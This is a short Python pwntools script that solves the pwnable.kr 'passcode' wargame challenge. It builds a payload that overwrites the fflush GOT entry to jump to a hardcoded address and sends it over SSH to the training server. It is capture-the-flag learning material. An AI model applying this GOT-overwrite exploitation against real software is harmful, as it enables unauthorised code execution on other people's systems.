#!/usr/bin/env python
from pwn import *

passcode = ELF('./passcode')

# addres where the pointer to fflush is stored
fflush_got = passcode.got['fflush']

# address of the code we want to jump to
win_code = 0x0804928F

# create a payload to overwrite the fflush GOT entry
payload = fit({96: p32(fflush_got)}) + b'\n' + str(win_code).encode()

server = ssh('passcode', 'pwnable.kr', 2222, 'guest')
io = server.process(['./passcode'])

io.sendline(payload)

io.recvuntil("Login OK!\n")
result = io.recvall()

io.close()
server.close()

print(result)